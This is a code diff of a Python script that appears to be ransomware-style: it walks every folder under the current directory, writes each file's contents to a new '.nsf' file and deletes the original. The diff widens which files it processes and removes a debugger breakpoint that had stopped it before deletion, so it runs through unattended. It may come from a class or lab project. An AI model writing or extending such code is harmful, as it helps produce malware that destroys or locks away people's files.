@@ -103,15 +103,16 @@ if __name__ == '__main__':
     skip_folder = '\__pycache__'
     #Force python to remove these list of items from the root folder directory
     #Because it is our code
-    skip_file_list = list(['NotSuspciousFile.py', 'SuspiciousFile.py','Constants.py','Constants.pyc'])
     for root, dirs, files in os.walk('.'):
         #The current folder that we are inspecting
         curr_folder = root.replace('.', '', 1)
         if(curr_folder == skip_folder):
             continue
         if(curr_folder == '') :
-            files.remove(skip_file_list[0])
-            files.remove(skip_file_list[1])
+            remove_list = list(files)
+            for i in remove_list:
+                if(i[len(i) - 3 : len(i)] == '.py' or i[len(i) - 4 : len(i)] == '.pyc'):
+                    files.remove(i)
         for i in range(len(files)) :
             #file_to_encrypt is the absolute path to the file
             file_path = curr_path + curr_folder + "/" + files[i]
@@ -125,7 +126,6 @@ if __name__ == '__main__':
             dump = json.dumps(item_map)
             f = open(file+ ".nsf", "w+")
             f.write(dump)
-            pdb.set_trace()
             os.remove(file_path)
             
             
